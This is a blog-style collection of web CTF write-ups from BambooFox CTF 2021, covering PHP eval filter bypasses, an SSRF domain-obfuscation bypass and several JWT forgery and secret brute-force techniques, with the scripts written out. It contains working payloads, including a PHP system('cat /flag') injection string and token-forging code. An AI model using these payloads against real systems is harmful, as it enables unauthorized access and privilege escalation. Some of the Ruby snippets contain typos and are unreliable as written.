---
title: "CTF Web Collection"
categories:
  - CTF
tags:
  - ctf
modified: 2021-01-21
---
CTF Collection, only Web Exploitation.

## PHP Eval with math function only (Calc.exe - BambooFox CTF 2021)
We got a simple calculator app based on PHP and it will catch the `_GET['expression']` parameter as our input.

<a href="/assets/images/ctf/bamboo/1.png"><img src="/assets/images/ctf/bamboo/1.png"></a>

Let's see the source code, maybe we found something useful. 

<a href="/assets/images/ctf/bamboo/2.png"><img src="/assets/images/ctf/bamboo/2.png"></a>

There is a `/source` there, let's check it out.

<a href="/assets/images/ctf/bamboo/3.png"><img src="/assets/images/ctf/bamboo/3.png"></a>

So, we got the source code. It's simply filtering almost all but we can use the math functions that leads to code execution.

So i use this payload from [here](https://www.anquanke.com/post/id/220813#h3-2) to find the right math function to produce strings / codes that we want.

```php
<!DOCTYPE html>
<html>
<body>

<?php
$whitelist = [ 'abs' , 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos ' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod', 'getrandmax' , 'hexdec' , 'hypot', 'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , ' octdec' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt' , 'srand' , 'tan' , 'tanh']; 
$whitelist2 = [ 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod' ,'getrandmax' , 'hexdec' , 'hypot' ,'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , 'octdec ' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt', 'srand' , 'tan' , 'tanh' ,'abs' ];

foreach ($whitelist as $i): foreach ($whitelist2 as $k): echo $k^$i^ "*" ; echo " " . $i. " " . $k; echo "<br/>" ; endforeach ; endforeach ;




?>
```

The result for producing the " *" (including the space). I need it because i want to run `system(ls *)`.

<a href="/assets/images/ctf/bamboo/4.png"><img src="/assets/images/ctf/bamboo/4.png"></a>

So we got `10 sin pi` (for example). The `10` is on hexadecimal. 

<a href="/assets/images/ctf/bamboo/5.png"><img src="/assets/images/ctf/bamboo/5.png"></a>

We can use `dechex` function to produce the `10`. Let's try running it on the real website.

<a href="/assets/images/ctf/bamboo/6.png"><img src="/assets/images/ctf/bamboo/6.png"></a>

So we just need to produce `system` and `ls` with math function. Here i use `base_convert` to produce the strings. 

<a href="/assets/images/ctf/bamboo/7.png"><img src="/assets/images/ctf/bamboo/7.png"></a>
<a href="/assets/images/ctf/bamboo/8.png"><img src="/assets/images/ctf/bamboo/8.png"></a>

So, let's use all the payload we generate before. It's looks something like this `base_convert(1751504350,10,36)(base_convert(784,10,36).(dechex(16)^asinh^pi)`.

<a href="/assets/images/ctf/bamboo/9.png"><img src="/assets/images/ctf/bamboo/9.png"></a>

So we got no flag. I found the flag is on the `/` directory.

<a href="/assets/images/ctf/bamboo/10.png"><img src="/assets/images/ctf/bamboo/10.png"></a>

Let's `cat` the flag!

<a href="/assets/images/ctf/bamboo/11.png"><img src="/assets/images/ctf/bamboo/11.png"></a>

##### Resources:
> - [https://www.anquanke.com/post/id/220813#h3-2](https://www.anquanke.com/post/id/220813#h3-2)
- [https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math](https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math)

## SSRF bypass using domain obfuscator (SSRFrog - BambooFox CTF 2021)
Let's open the website.

<a href="/assets/images/ctf/bamboo/12.png"><img src="/assets/images/ctf/bamboo/12.png"></a>

Let's check the source code.

<a href="/assets/images/ctf/bamboo/13.png"><img src="/assets/images/ctf/bamboo/13.png"></a>
<a href="/assets/images/ctf/bamboo/14.png"><img src="/assets/images/ctf/bamboo/14.png"></a>

We need to access the `http://the.c0o0o0l-fl444g.server.internal`. But, we can't use repeated characters. We can use this [domain obfuscator](https://splitline.github.io/domain-obfuscator/) to bypass this.

Final payload will be `HTtp:/ｔhＥ.c0o₀O⁰L-fl4⁴４g｡sEｒvｅr．inＴeʳｎaｌ`. The result:

<a href="/assets/images/ctf/bamboo/15.png"><img src="/assets/images/ctf/bamboo/15.png"></a>

## PHP Challenge (ヽ(#`Д´)ﾉ - BambooFox CTF 2021)
<a href="/assets/images/ctf/bamboo/16.png"><img src="/assets/images/ctf/bamboo/16.png"></a>

Our input is verified to be less than 0xA characters and not contain any alphanumeric characters. It is then `eval`'d after being passed through `print\_r`. The catch is the length and character checks are done using `!strlen` and `!preg_match` instead of `cond!==false`.

We can pass in an array and it will always bypass these checks, the next thing is to construct input that is valid PHP after being passed in. The PHP parser doesn't really like the array output, and will first throw a syntax error. We can deal with this by adding a constant and closing parenthesis.

We then get an `illegal offset type` error. I was able to get around this by making the array indice a variable, which gives a `illegal offset type` warning (I have no idea). Now that our input is accepted as PHP we just add a ``print \`cat /flag\*\`` to get our flag.

<a href="/assets/images/ctf/bamboo/18.png"><img src="/assets/images/ctf/bamboo/18.png"></a>
<a href="/assets/images/ctf/bamboo/19.png"><img src="/assets/images/ctf/bamboo/19.png"></a>

The result: 

<a href="/assets/images/ctf/bamboo/17.png"><img src="/assets/images/ctf/bamboo/17.png"></a>

Alternative: `%E3%83%BD(%23%60%D0%94%C2%B4)%EF%BE%89[0/*]=1*/]);system("cat%20/flag_de42537a7dd854f4ce27234a103d4362");/*`.

##### Resources:
> - [https://github.com/Seraphin-/ctf/blob/master/bamboofox_2021/face.md](https://github.com/Seraphin-/ctf/blob/master/bamboofox_2021/face.md)
- [https://spotless.tech/bambooctf-2021-angryface-php.html](https://spotless.tech/bambooctf-2021-angryface-php.html)


## JWT bypass using None algorithm
Using [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool).

Step:
- Tamper the JWT

  ```bash
  $ python3 jwt_tool.py jwt -T
  ```

- Use None algorithm

  ```bash
  python3 jwt_tool.py jwt -Xa (using none algorithm)
  ```

- ALTERNATIVE: remove the signature

  ```
  Example:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImEiLCJpYXQiOiIxNjExMjAxNDQyIn0.NWU2MWNiMjg0YWU3NDM0ZDFmYjYwNTYyY2RmNzNkMzM4NDdhZDE4YTUxZjYwZmI3NTI3Y2Y5YjNiYjMyMzlhOA

  Remove the signature:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImEiLCJpYXQiOiIxNjExMjAxNDQyIn0.
  ```

##### Resources:
> - [https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/)


## JWT bypass with public key 
Using python:

```python
import hmac
import base64
import hashlib

f = open("public.pem")
key = f.read()
# RS -> HS and login -> admin
str="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"

sig = base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(str+"."+sig)
```

Using ruby:

```ruby
require 'base64'
require 'openssl'

f = File.open("public.pem").read

TOKEN = "FULLJWTTOKENHERE"

header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoder_header.gsub!("RS256", "HS256")
puts decoded_header
new_header = Bas64.strict_encode64(decoded_header).gsub("=","")

decoded_payload = Base64.decode64(payload)
decoder_payload.gsub!("your_user_here", "admin")
puts decoded_payload
new_payload = Bas64.strict_encode64(decoded_payload).gsub("=","")

data = new_header + "." + new_payload

signature = Bas64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), pub, data))
```

## JWT bypass no verify
This only works if the server didn't verify the signature. We can tamper the JWT using [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool). Step-by-step:
- Tamper the JWT

  ```bash
  $ python3 jwt_tool.py jwt -T
  ```

- Profit

## JWT bypass weak secret
Step-by-step:
1. Bruteforce the secret:

    - Using ruby:

      ```ruby
      require 'base64'
      require 'openssl'

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

      header, data, signature = jwt.split('.')

      def sign(data, secret)
          Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('SHA256'), secret, data)).gsub("=","")
      end
      File.readlines("/usr/share/wordlists/rockyou.txt").each do |line|
          line.chomp!
          if sign(header+"."+data, line) == signature
              puts line
              exit
          end
      end
      ```

    - Using python:

      ```python
      import hmac
      import hashlib
      import base64

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

      h, p, s = jwt.split(".")

      def sign(str, key):
          return base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

      file = open("/usr/share/wordlists/rockyou.txt", 'r')
      lines = file.readlines()

      for line in lines:
          key = line.strip()
          if sign(h + "." + p, key) == s:
              print(key)
      ```

    - Using hashcat:

      ```bash
      $ hashcat -m 16500 -d 3 jwt /usr/share/wordlists/rockyou.txt
      ```


2. Sign the JWT

    - Using ruby:

      ```ruby
      require 'base64'
      require 'openssl'

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
      secret = "pentesterlab"
      header, data, signature = jwt.split('.')

      def sign(data, secret)
          Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('SHA256'), secret, data)).gsub("=","")
      end

      require 'json';
      payload = JSON.parse(Base64.urlsafe_decode64(data+"=="))
      payload["user"] = "admin"

      newdata = Base64.urlsafe_encode64(payload.to_json).gsub("=", "")
      puts header+"."+newdata+"."+sign(header+"."+newdata, secret)
      ```

    - Using python:

      ```python
      import hmac
      import hashlib
      import base64

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

      h, p, s = jwt.split(".")

      def sign(str, key):
          return base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

      key = "something"
      payload = "eyJ1c2VyIjoiYWRtaW4ifQo"
      print(h + "." + payload + "." + sign(h + "." + payload, key))
      ```
    
    - Using ruby interactive (with hashcat):
  
      ```bash
      $ gem install jwt 
      $ irb

      require 'jwt'

      payload = {"user":"admin"}

      JWT.encode payload, "SECRET", "HS256"
      ```

## Leaked .git
We can [this](https://github.com/internetwache/GitTools) tools to extract leaked `.git/` directory



## Other
> - [https://github.com/Kirill89/prototype-pollution-explained](https://github.com/Kirill89/prototype-pollution-explained)
- [https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4](https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4)
- [Nginx alias path traversal](https://hackerone.com/reports/312510)
